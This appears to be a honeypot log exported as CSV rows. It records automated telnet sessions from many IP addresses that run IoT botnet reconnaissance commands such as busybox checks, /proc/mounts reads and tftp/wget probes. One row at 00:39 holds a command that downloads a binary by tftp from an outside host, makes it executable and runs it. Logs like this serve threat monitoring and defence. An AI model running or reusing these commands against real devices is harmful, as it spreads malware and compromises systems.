+"Mar 10, 2023 @ 08:04:43.998",tftp; wget; /bin/busybox TJKDS,223.8.205.227,-,China
+"Mar 10, 2023 @ 08:04:43.706",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox TJKDS,223.8.205.227,-,China
+"Mar 10, 2023 @ 08:04:43.414",cat /proc/mounts; /bin/busybox TJKDS,223.8.205.227,-,China
+"Mar 10, 2023 @ 08:04:43.158",sh,223.8.205.227,-,China
+"Mar 10, 2023 @ 08:04:43.157",shell,223.8.205.227,-,China
+"Mar 10, 2023 @ 08:04:43.157",shell,223.8.205.227,-,China
+"Mar 10, 2023 @ 08:04:43.156",system,223.8.205.227,-,China
+"Mar 10, 2023 @ 08:04:43.155",system,223.8.205.227,-,China
+"Mar 10, 2023 @ 08:04:43.153",enable,223.8.205.227,-,China
+"Mar 10, 2023 @ 07:30:10.697",rm .s; exit,222.246.108.141,Changde,China
+"Mar 10, 2023 @ 07:30:10.695",/bin/busybox FVJIZ,222.246.108.141,Changde,China
+"Mar 10, 2023 @ 07:30:10.453",while read i,222.246.108.141,Changde,China
+"Mar 10, 2023 @ 07:30:10.450",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,222.246.108.141,Changde,China
+"Mar 10, 2023 @ 07:30:10.203",tftp; wget; /bin/busybox FVJIZ,222.246.108.141,Changde,China
+"Mar 10, 2023 @ 07:30:09.960",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox FVJIZ,222.246.108.141,Changde,China
+"Mar 10, 2023 @ 07:30:09.195",cat /proc/mounts; /bin/busybox FVJIZ,222.246.108.141,Changde,China
+"Mar 10, 2023 @ 07:30:08.951",sh,222.246.108.141,Changde,China
+"Mar 10, 2023 @ 07:30:08.950",shell,222.246.108.141,Changde,China
+"Mar 10, 2023 @ 07:30:08.949",shell,222.246.108.141,Changde,China
+"Mar 10, 2023 @ 07:30:08.948",system,222.246.108.141,Changde,China
+"Mar 10, 2023 @ 07:30:08.948",system,222.246.108.141,Changde,China
+"Mar 10, 2023 @ 07:30:08.945",enable,222.246.108.141,Changde,China
+"Mar 10, 2023 @ 06:04:20.322",rm .s; exit,36.48.64.189,Changchun,China
+"Mar 10, 2023 @ 06:04:20.145",/bin/busybox NWMXZ,36.48.64.189,Changchun,China
+"Mar 10, 2023 @ 06:04:19.883",while read i,36.48.64.189,Changchun,China
+"Mar 10, 2023 @ 06:04:19.880",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,36.48.64.189,Changchun,China
+"Mar 10, 2023 @ 06:04:19.564",tftp; wget; /bin/busybox NWMXZ,36.48.64.189,Changchun,China
+"Mar 10, 2023 @ 06:04:19.297",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox NWMXZ,36.48.64.189,Changchun,China
+"Mar 10, 2023 @ 06:04:18.710",cat /proc/mounts; /bin/busybox NWMXZ,36.48.64.189,Changchun,China
+"Mar 10, 2023 @ 06:04:18.411",sh,36.48.64.189,Changchun,China
+"Mar 10, 2023 @ 06:04:18.410",shell,36.48.64.189,Changchun,China
+"Mar 10, 2023 @ 06:04:18.410",shell,36.48.64.189,Changchun,China
+"Mar 10, 2023 @ 06:04:18.409",system,36.48.64.189,Changchun,China
+"Mar 10, 2023 @ 06:04:18.400",system,36.48.64.189,Changchun,China
+"Mar 10, 2023 @ 06:04:18.398",enable,36.48.64.189,Changchun,China
+"Mar 10, 2023 @ 05:20:14.090",rm .s; exit,113.25.130.24,Zhongshan,China
+"Mar 10, 2023 @ 05:20:14.087",/bin/busybox NHEMZ,113.25.130.24,Zhongshan,China
+"Mar 10, 2023 @ 05:20:13.831",while read i,113.25.130.24,Zhongshan,China
+"Mar 10, 2023 @ 05:20:13.828",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,113.25.130.24,Zhongshan,China
+"Mar 10, 2023 @ 05:20:13.555",tftp; wget; /bin/busybox NHEMZ,113.25.130.24,Zhongshan,China
+"Mar 10, 2023 @ 05:20:13.297",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox NHEMZ,113.25.130.24,Zhongshan,China
+"Mar 10, 2023 @ 05:20:13.016",cat /proc/mounts; /bin/busybox NHEMZ,113.25.130.24,Zhongshan,China
+"Mar 10, 2023 @ 05:20:12.755",sh,113.25.130.24,Zhongshan,China
+"Mar 10, 2023 @ 05:20:12.753",shell,113.25.130.24,Zhongshan,China
+"Mar 10, 2023 @ 05:20:12.752",shell,113.25.130.24,Zhongshan,China
+"Mar 10, 2023 @ 05:20:12.751",system,113.25.130.24,Zhongshan,China
+"Mar 10, 2023 @ 05:20:12.750",system,113.25.130.24,Zhongshan,China
+"Mar 10, 2023 @ 05:20:12.749",enable,113.25.130.24,Zhongshan,China
+"Mar 10, 2023 @ 05:06:54.153",rm .s; exit,110.182.124.16,-,China
+"Mar 10, 2023 @ 05:06:54.139",/bin/busybox MZUEG,110.182.124.16,-,China
+"Mar 10, 2023 @ 05:06:53.858",while read i,110.182.124.16,-,China
+"Mar 10, 2023 @ 05:06:53.842",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,110.182.124.16,-,China
+"Mar 10, 2023 @ 05:06:53.566",tftp; wget; /bin/busybox MZUEG,110.182.124.16,-,China
+"Mar 10, 2023 @ 05:06:53.270",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox MZUEG,110.182.124.16,-,China
+"Mar 10, 2023 @ 05:06:52.974",cat /proc/mounts; /bin/busybox MZUEG,110.182.124.16,-,China
+"Mar 10, 2023 @ 05:06:52.680",sh,110.182.124.16,-,China
+"Mar 10, 2023 @ 05:06:52.679",shell,110.182.124.16,-,China
+"Mar 10, 2023 @ 05:06:52.678",system,110.182.124.16,-,China
+"Mar 10, 2023 @ 05:06:52.678",shell,110.182.124.16,-,China
+"Mar 10, 2023 @ 05:06:52.677",system,110.182.124.16,-,China
+"Mar 10, 2023 @ 05:06:52.658",enable,110.182.124.16,-,China
+"Mar 10, 2023 @ 04:53:50.646",rm .s; exit,106.41.74.164,-,China
+"Mar 10, 2023 @ 04:53:50.630",/bin/busybox OZPCS,106.41.74.164,-,China
+"Mar 10, 2023 @ 04:53:50.362",while read i,106.41.74.164,-,China
+"Mar 10, 2023 @ 04:53:50.359",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,106.41.74.164,-,China
+"Mar 10, 2023 @ 04:53:50.073",tftp; wget; /bin/busybox OZPCS,106.41.74.164,-,China
+"Mar 10, 2023 @ 04:53:49.792",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox OZPCS,106.41.74.164,-,China
+"Mar 10, 2023 @ 04:53:49.504",cat /proc/mounts; /bin/busybox OZPCS,106.41.74.164,-,China
+"Mar 10, 2023 @ 04:53:49.217",sh,106.41.74.164,-,China
+"Mar 10, 2023 @ 04:53:49.216",shell,106.41.74.164,-,China
+"Mar 10, 2023 @ 04:53:49.215",shell,106.41.74.164,-,China
+"Mar 10, 2023 @ 04:53:49.213",system,106.41.74.164,-,China
+"Mar 10, 2023 @ 04:53:49.213",system,106.41.74.164,-,China
+"Mar 10, 2023 @ 04:53:49.211",enable,106.41.74.164,-,China
+"Mar 10, 2023 @ 04:39:18.159",rm .s; exit,123.185.223.115,Dalian,China
+"Mar 10, 2023 @ 04:39:18.156",/bin/busybox UTOYA,123.185.223.115,Dalian,China
+"Mar 10, 2023 @ 04:39:17.902",while read i,123.185.223.115,Dalian,China
+"Mar 10, 2023 @ 04:39:17.898",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,123.185.223.115,Dalian,China
+"Mar 10, 2023 @ 04:39:17.640",tftp; wget; /bin/busybox UTOYA,123.185.223.115,Dalian,China
+"Mar 10, 2023 @ 04:39:17.370",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox UTOYA,123.185.223.115,Dalian,China
+"Mar 10, 2023 @ 04:39:17.098",cat /proc/mounts; /bin/busybox UTOYA,123.185.223.115,Dalian,China
+"Mar 10, 2023 @ 04:39:16.841",sh,123.185.223.115,Dalian,China
+"Mar 10, 2023 @ 04:39:16.840",shell,123.185.223.115,Dalian,China
+"Mar 10, 2023 @ 04:39:16.839",shell,123.185.223.115,Dalian,China
+"Mar 10, 2023 @ 04:39:16.836",system,123.185.223.115,Dalian,China
+"Mar 10, 2023 @ 04:39:16.836",system,123.185.223.115,Dalian,China
+"Mar 10, 2023 @ 04:39:16.834",enable,123.185.223.115,Dalian,China
+"Mar 10, 2023 @ 03:32:58.415",rm .s; exit,85.185.210.231,-,Iran
+"Mar 10, 2023 @ 03:32:58.411",/bin/busybox JJSHB,85.185.210.231,-,Iran
+"Mar 10, 2023 @ 03:32:58.218",while read i,85.185.210.231,-,Iran
+"Mar 10, 2023 @ 03:32:58.212",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,85.185.210.231,-,Iran
+"Mar 10, 2023 @ 03:32:58.018",tftp; wget; /bin/busybox JJSHB,85.185.210.231,-,Iran
+"Mar 10, 2023 @ 03:32:57.822",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox JJSHB,85.185.210.231,-,Iran
+"Mar 10, 2023 @ 03:32:57.623",cat /proc/mounts; /bin/busybox JJSHB,85.185.210.231,-,Iran
+"Mar 10, 2023 @ 03:32:57.430",sh,85.185.210.231,-,Iran
+"Mar 10, 2023 @ 03:32:57.429",shell,85.185.210.231,-,Iran
+"Mar 10, 2023 @ 03:32:57.428",shell,85.185.210.231,-,Iran
+"Mar 10, 2023 @ 03:32:57.427",system,85.185.210.231,-,Iran
+"Mar 10, 2023 @ 03:32:57.426",system,85.185.210.231,-,Iran
+"Mar 10, 2023 @ 03:32:57.425",enable,85.185.210.231,-,Iran
+"Mar 10, 2023 @ 03:04:20.572",rm .s; exit,223.13.64.108,-,China
+"Mar 10, 2023 @ 03:04:20.570",/bin/busybox GPZQV,223.13.64.108,-,China
+"Mar 10, 2023 @ 03:04:20.304",while read i,223.13.64.108,-,China
+"Mar 10, 2023 @ 03:04:20.299",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,223.13.64.108,-,China
+"Mar 10, 2023 @ 03:04:20.026",tftp; wget; /bin/busybox GPZQV,223.13.64.108,-,China
+"Mar 10, 2023 @ 03:04:19.747",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox GPZQV,223.13.64.108,-,China
+"Mar 10, 2023 @ 03:04:19.454",cat /proc/mounts; /bin/busybox GPZQV,223.13.64.108,-,China
+"Mar 10, 2023 @ 03:04:19.182",sh,223.13.64.108,-,China
+"Mar 10, 2023 @ 03:04:19.181",shell,223.13.64.108,-,China
+"Mar 10, 2023 @ 03:04:19.180",shell,223.13.64.108,-,China
+"Mar 10, 2023 @ 03:04:19.179",system,223.13.64.108,-,China
+"Mar 10, 2023 @ 03:04:19.176",system,223.13.64.108,-,China
+"Mar 10, 2023 @ 03:04:19.174",enable,223.13.64.108,-,China
+"Mar 10, 2023 @ 02:50:24.847",rm .s; exit,114.216.177.136,Shanghai,China
+"Mar 10, 2023 @ 02:50:24.843",/bin/busybox RDNEL,114.216.177.136,Shanghai,China
+"Mar 10, 2023 @ 02:50:24.613",while read i,114.216.177.136,Shanghai,China
+"Mar 10, 2023 @ 02:50:24.610",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,114.216.177.136,Shanghai,China
+"Mar 10, 2023 @ 02:50:24.361",tftp; wget; /bin/busybox RDNEL,114.216.177.136,Shanghai,China
+"Mar 10, 2023 @ 02:50:24.127",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox RDNEL,114.216.177.136,Shanghai,China
+"Mar 10, 2023 @ 02:50:23.868",cat /proc/mounts; /bin/busybox RDNEL,114.216.177.136,Shanghai,China
+"Mar 10, 2023 @ 02:50:23.636",sh,114.216.177.136,Shanghai,China
+"Mar 10, 2023 @ 02:50:23.635",shell,114.216.177.136,Shanghai,China
+"Mar 10, 2023 @ 02:50:23.632",system,114.216.177.136,Shanghai,China
+"Mar 10, 2023 @ 02:50:23.632",shell,114.216.177.136,Shanghai,China
+"Mar 10, 2023 @ 02:50:23.631",system,114.216.177.136,Shanghai,China
+"Mar 10, 2023 @ 02:50:23.629",enable,114.216.177.136,Shanghai,China
+"Mar 10, 2023 @ 02:07:23.400",rm .s; exit,49.89.185.43,-,China
+"Mar 10, 2023 @ 02:07:23.392",/bin/busybox FKWDL,49.89.185.43,-,China
+"Mar 10, 2023 @ 02:07:23.178",while read i,49.89.185.43,-,China
+"Mar 10, 2023 @ 02:07:23.175",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,49.89.185.43,-,China
+"Mar 10, 2023 @ 02:07:22.957",tftp; wget; /bin/busybox FKWDL,49.89.185.43,-,China
+"Mar 10, 2023 @ 02:07:22.725",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox FKWDL,49.89.185.43,-,China
+"Mar 10, 2023 @ 02:07:22.500",cat /proc/mounts; /bin/busybox FKWDL,49.89.185.43,-,China
+"Mar 10, 2023 @ 02:07:22.264",sh,49.89.185.43,-,China
+"Mar 10, 2023 @ 02:07:22.263",shell,49.89.185.43,-,China
+"Mar 10, 2023 @ 02:07:22.263",shell,49.89.185.43,-,China
+"Mar 10, 2023 @ 02:07:22.262",system,49.89.185.43,-,China
+"Mar 10, 2023 @ 02:07:22.261",system,49.89.185.43,-,China
+"Mar 10, 2023 @ 02:07:22.259",enable,49.89.185.43,-,China
+"Mar 10, 2023 @ 01:55:48.887",rm .s; exit,223.15.53.196,-,China
+"Mar 10, 2023 @ 01:55:48.882",/bin/busybox IWEQD,223.15.53.196,-,China
+"Mar 10, 2023 @ 01:55:48.623",while read i,223.15.53.196,-,China
+"Mar 10, 2023 @ 01:55:48.619",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,223.15.53.196,-,China
+"Mar 10, 2023 @ 01:55:48.353",tftp; wget; /bin/busybox IWEQD,223.15.53.196,-,China
+"Mar 10, 2023 @ 01:55:48.080",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox IWEQD,223.15.53.196,-,China
+"Mar 10, 2023 @ 01:55:47.278",cat /proc/mounts; /bin/busybox IWEQD,223.15.53.196,-,China
+"Mar 10, 2023 @ 01:55:47.007",sh,223.15.53.196,-,China
+"Mar 10, 2023 @ 01:55:47.007",shell,223.15.53.196,-,China
+"Mar 10, 2023 @ 01:55:47.006",shell,223.15.53.196,-,China
+"Mar 10, 2023 @ 01:55:47.005",system,223.15.53.196,-,China
+"Mar 10, 2023 @ 01:55:47.004",system,223.15.53.196,-,China
+"Mar 10, 2023 @ 01:55:47.003",enable,223.15.53.196,-,China
+"Mar 10, 2023 @ 01:04:12.510",rm .s; exit,187.213.35.180,Altamira,Mexico
+"Mar 10, 2023 @ 01:04:12.508",/bin/busybox JELPE,187.213.35.180,Altamira,Mexico
+"Mar 10, 2023 @ 01:04:12.439",while read i,187.213.35.180,Altamira,Mexico
+"Mar 10, 2023 @ 01:04:12.436",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,187.213.35.180,Altamira,Mexico
+"Mar 10, 2023 @ 01:04:12.365",tftp; wget; /bin/busybox JELPE,187.213.35.180,Altamira,Mexico
+"Mar 10, 2023 @ 01:04:12.295",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox JELPE,187.213.35.180,Altamira,Mexico
+"Mar 10, 2023 @ 01:04:12.220",cat /proc/mounts; /bin/busybox JELPE,187.213.35.180,Altamira,Mexico
+"Mar 10, 2023 @ 01:04:12.150",shell,187.213.35.180,Altamira,Mexico
+"Mar 10, 2023 @ 01:04:12.150",sh,187.213.35.180,Altamira,Mexico
+"Mar 10, 2023 @ 01:04:12.149",shell,187.213.35.180,Altamira,Mexico
+"Mar 10, 2023 @ 01:04:12.148",system,187.213.35.180,Altamira,Mexico
+"Mar 10, 2023 @ 01:04:12.147",system,187.213.35.180,Altamira,Mexico
+"Mar 10, 2023 @ 01:04:12.145",enable,187.213.35.180,Altamira,Mexico
+"Mar 10, 2023 @ 00:39:51.817",rm .s; tftp -l.i -r.i -g 168.181.123.73:47235; chmod 777 .i; ./.i; exit,223.10.10.115,-,China
+"Mar 10, 2023 @ 00:39:51.579",/bin/busybox NBNXG,223.10.10.115,-,China
+"Mar 10, 2023 @ 00:39:51.343",while read i,223.10.10.115,-,China
+"Mar 10, 2023 @ 00:39:51.340",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,223.10.10.115,-,China
+"Mar 10, 2023 @ 00:39:51.098",tftp; wget; /bin/busybox NBNXG,223.10.10.115,-,China
+"Mar 10, 2023 @ 00:39:50.859",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox NBNXG,223.10.10.115,-,China
+"Mar 10, 2023 @ 00:39:50.608",cat /proc/mounts; /bin/busybox NBNXG,223.10.10.115,-,China
+"Mar 10, 2023 @ 00:39:50.367",sh,223.10.10.115,-,China
+"Mar 10, 2023 @ 00:39:50.366",shell,223.10.10.115,-,China
+"Mar 10, 2023 @ 00:39:50.365",shell,223.10.10.115,-,China
+"Mar 10, 2023 @ 00:39:50.365",system,223.10.10.115,-,China
+"Mar 10, 2023 @ 00:39:50.364",system,223.10.10.115,-,China
+"Mar 10, 2023 @ 00:39:50.362",enable,223.10.10.115,-,China
+"Mar 10, 2023 @ 00:34:32.345",rm .s; exit,36.48.64.189,Changchun,China
+"Mar 10, 2023 @ 00:34:32.197",/bin/busybox RVRRT,36.48.64.189,Changchun,China
+"Mar 10, 2023 @ 00:34:31.576",while read i,36.48.64.189,Changchun,China
+"Mar 10, 2023 @ 00:34:31.573",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,36.48.64.189,Changchun,China
+"Mar 10, 2023 @ 00:34:31.052",tftp; wget; /bin/busybox RVRRT,36.48.64.189,Changchun,China
+"Mar 10, 2023 @ 00:34:30.727",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox RVRRT,36.48.64.189,Changchun,China
+"Mar 10, 2023 @ 00:34:30.243",cat /proc/mounts; /bin/busybox RVRRT,36.48.64.189,Changchun,China
+"Mar 10, 2023 @ 00:34:29.920",sh,36.48.64.189,Changchun,China
+"Mar 10, 2023 @ 00:34:29.919",shell,36.48.64.189,Changchun,China
+"Mar 10, 2023 @ 00:34:29.918",shell,36.48.64.189,Changchun,China
+"Mar 10, 2023 @ 00:34:29.917",system,36.48.64.189,Changchun,China
+"Mar 10, 2023 @ 00:34:29.916",system,36.48.64.189,Changchun,China
+"Mar 10, 2023 @ 00:34:29.914",enable,36.48.64.189,Changchun,China
+"Mar 10, 2023 @ 00:25:57.404",rm .s; exit,117.63.78.226,Suzhou,China
+"Mar 10, 2023 @ 00:25:57.395",/bin/busybox UIVUL,117.63.78.226,Suzhou,China
+"Mar 10, 2023 @ 00:25:57.196",while read i,117.63.78.226,Suzhou,China
+"Mar 10, 2023 @ 00:25:57.192",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,117.63.78.226,Suzhou,China
+"Mar 10, 2023 @ 00:25:56.989",tftp; wget; /bin/busybox UIVUL,117.63.78.226,Suzhou,China
+"Mar 10, 2023 @ 00:25:56.779",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox UIVUL,117.63.78.226,Suzhou,China
+"Mar 10, 2023 @ 00:25:56.558",cat /proc/mounts; /bin/busybox UIVUL,117.63.78.226,Suzhou,China
+"Mar 10, 2023 @ 00:25:56.338",sh,117.63.78.226,Suzhou,China
+"Mar 10, 2023 @ 00:25:56.337",shell,117.63.78.226,Suzhou,China
+"Mar 10, 2023 @ 00:25:56.336",shell,117.63.78.226,Suzhou,China
+"Mar 10, 2023 @ 00:25:56.335",system,117.63.78.226,Suzhou,China
+"Mar 10, 2023 @ 00:25:56.334",system,117.63.78.226,Suzhou,China
+"Mar 10, 2023 @ 00:25:56.332",enable,117.63.78.226,Suzhou,China
+"Mar 9, 2023 @ 23:58:50.672",rm .s; exit,106.111.38.59,-,China
+"Mar 9, 2023 @ 23:58:50.664",/bin/busybox SLVDR,106.111.38.59,-,China
+"Mar 9, 2023 @ 23:58:50.420",while read i,106.111.38.59,-,China
+"Mar 9, 2023 @ 23:58:50.417",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,106.111.38.59,-,China
+"Mar 9, 2023 @ 23:58:50.169",tftp; wget; /bin/busybox SLVDR,106.111.38.59,-,China
+"Mar 9, 2023 @ 23:58:49.924",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox SLVDR,106.111.38.59,-,China
+"Mar 9, 2023 @ 23:58:49.682",cat /proc/mounts; /bin/busybox SLVDR,106.111.38.59,-,China
+"Mar 9, 2023 @ 23:58:49.447",shell,106.111.38.59,-,China
+"Mar 9, 2023 @ 23:58:49.447",sh,106.111.38.59,-,China
+"Mar 9, 2023 @ 23:58:49.446",shell,106.111.38.59,-,China
+"Mar 9, 2023 @ 23:58:49.445",system,106.111.38.59,-,China
+"Mar 9, 2023 @ 23:58:49.444",system,106.111.38.59,-,China
+"Mar 9, 2023 @ 23:58:49.442",enable,106.111.38.59,-,China
+"Mar 9, 2023 @ 23:33:39.487",rm .s; exit,113.246.132.247,Changsha,China
+"Mar 9, 2023 @ 23:33:39.485",/bin/busybox YWIQR,113.246.132.247,Changsha,China
+"Mar 9, 2023 @ 23:33:39.250",while read i,113.246.132.247,Changsha,China
+"Mar 9, 2023 @ 23:33:39.247",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,113.246.132.247,Changsha,China
+"Mar 9, 2023 @ 23:33:39.003",tftp; wget; /bin/busybox YWIQR,113.246.132.247,Changsha,China
+"Mar 9, 2023 @ 23:33:38.765",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox YWIQR,113.246.132.247,Changsha,China
+"Mar 9, 2023 @ 23:33:38.526",cat /proc/mounts; /bin/busybox YWIQR,113.246.132.247,Changsha,China
+"Mar 9, 2023 @ 23:33:38.289",sh,113.246.132.247,Changsha,China
+"Mar 9, 2023 @ 23:33:38.288",shell,113.246.132.247,Changsha,China
+"Mar 9, 2023 @ 23:33:38.287",shell,113.246.132.247,Changsha,China
+"Mar 9, 2023 @ 23:33:38.286",system,113.246.132.247,Changsha,China
+"Mar 9, 2023 @ 23:33:38.285",system,113.246.132.247,Changsha,China
+"Mar 9, 2023 @ 23:33:38.283",enable,113.246.132.247,Changsha,China
+"Mar 9, 2023 @ 23:24:30.076",rm .s; exit,222.246.40.255,Changde,China
+"Mar 9, 2023 @ 23:24:30.068",/bin/busybox HVWJW,222.246.40.255,Changde,China
+"Mar 9, 2023 @ 23:24:29.815",while read i,222.246.40.255,Changde,China
+"Mar 9, 2023 @ 23:24:29.812",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,222.246.40.255,Changde,China
+"Mar 9, 2023 @ 23:24:29.537",tftp; wget; /bin/busybox HVWJW,222.246.40.255,Changde,China
+"Mar 9, 2023 @ 23:24:29.281",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox HVWJW,222.246.40.255,Changde,China
+"Mar 9, 2023 @ 23:24:29.022",cat /proc/mounts; /bin/busybox HVWJW,222.246.40.255,Changde,China
+"Mar 9, 2023 @ 23:24:28.768",sh,222.246.40.255,Changde,China
+"Mar 9, 2023 @ 23:24:28.767",shell,222.246.40.255,Changde,China
+"Mar 9, 2023 @ 23:24:28.766",shell,222.246.40.255,Changde,China
+"Mar 9, 2023 @ 23:24:28.765",system,222.246.40.255,Changde,China
+"Mar 9, 2023 @ 23:24:28.765",system,222.246.40.255,Changde,China
+"Mar 9, 2023 @ 23:24:28.763",enable,222.246.40.255,Changde,China
+"Mar 9, 2023 @ 22:55:22.249",cat /bin/echo;,109.206.243.207,-,Germany
+"Mar 9, 2023 @ 22:52:50.010",rm .s; exit,105.163.55.62,-,Kenya
+"Mar 9, 2023 @ 22:52:50.007",/bin/busybox SGXBZ,105.163.55.62,-,Kenya
+"Mar 9, 2023 @ 22:52:49.740",while read i,105.163.55.62,-,Kenya
+"Mar 9, 2023 @ 22:52:49.737",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,105.163.55.62,-,Kenya
+"Mar 9, 2023 @ 22:52:49.469",tftp; wget; /bin/busybox SGXBZ,105.163.55.62,-,Kenya
+"Mar 9, 2023 @ 22:52:49.203",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox SGXBZ,105.163.55.62,-,Kenya
+"Mar 9, 2023 @ 22:52:48.935",cat /proc/mounts; /bin/busybox SGXBZ,105.163.55.62,-,Kenya
+"Mar 9, 2023 @ 22:52:48.673",sh,105.163.55.62,-,Kenya
+"Mar 9, 2023 @ 22:52:48.672",shell,105.163.55.62,-,Kenya
+"Mar 9, 2023 @ 22:52:48.671",shell,105.163.55.62,-,Kenya
+"Mar 9, 2023 @ 22:52:48.670",system,105.163.55.62,-,Kenya
+"Mar 9, 2023 @ 22:52:48.669",system,105.163.55.62,-,Kenya
+"Mar 9, 2023 @ 22:52:48.667",enable,105.163.55.62,-,Kenya
+"Mar 9, 2023 @ 22:38:16.303",rm .s; exit,123.187.108.121,-,China
+"Mar 9, 2023 @ 22:38:16.294",/bin/busybox QDVGZ,123.187.108.121,-,China
+"Mar 9, 2023 @ 22:38:16.075",while read i,123.187.108.121,-,China
+"Mar 9, 2023 @ 22:38:16.072",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,123.187.108.121,-,China
+"Mar 9, 2023 @ 22:38:15.849",tftp; wget; /bin/busybox QDVGZ,123.187.108.121,-,China
+"Mar 9, 2023 @ 22:38:15.627",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox QDVGZ,123.187.108.121,-,China
+"Mar 9, 2023 @ 22:38:15.403",cat /proc/mounts; /bin/busybox QDVGZ,123.187.108.121,-,China
+"Mar 9, 2023 @ 22:38:15.180",sh,123.187.108.121,-,China
+"Mar 9, 2023 @ 22:38:15.179",shell,123.187.108.121,-,China
+"Mar 9, 2023 @ 22:38:15.178",system,123.187.108.121,-,China
+"Mar 9, 2023 @ 22:38:15.178",shell,123.187.108.121,-,China
+"Mar 9, 2023 @ 22:38:15.177",system,123.187.108.121,-,China
+"Mar 9, 2023 @ 22:38:15.175",enable,123.187.108.121,-,China
+"Mar 9, 2023 @ 22:34:29.704",rm .s; exit,49.74.5.12,Nanjing,China
+"Mar 9, 2023 @ 22:34:29.702",/bin/busybox TENZC,49.74.5.12,Nanjing,China
+"Mar 9, 2023 @ 22:34:29.461",while read i,49.74.5.12,Nanjing,China
+"Mar 9, 2023 @ 22:34:29.457",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,49.74.5.12,Nanjing,China
+"Mar 9, 2023 @ 22:34:29.209",tftp; wget; /bin/busybox TENZC,49.74.5.12,Nanjing,China
+"Mar 9, 2023 @ 22:34:28.967",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox TENZC,49.74.5.12,Nanjing,China
+"Mar 9, 2023 @ 22:34:28.727",cat /proc/mounts; /bin/busybox TENZC,49.74.5.12,Nanjing,China
+"Mar 9, 2023 @ 22:34:28.489",sh,49.74.5.12,Nanjing,China
+"Mar 9, 2023 @ 22:34:28.487",shell,49.74.5.12,Nanjing,China
+"Mar 9, 2023 @ 22:34:28.487",shell,49.74.5.12,Nanjing,China
+"Mar 9, 2023 @ 22:34:28.486",system,49.74.5.12,Nanjing,China
+"Mar 9, 2023 @ 22:34:28.485",system,49.74.5.12,Nanjing,China
+"Mar 9, 2023 @ 22:34:28.481",enable,49.74.5.12,Nanjing,China
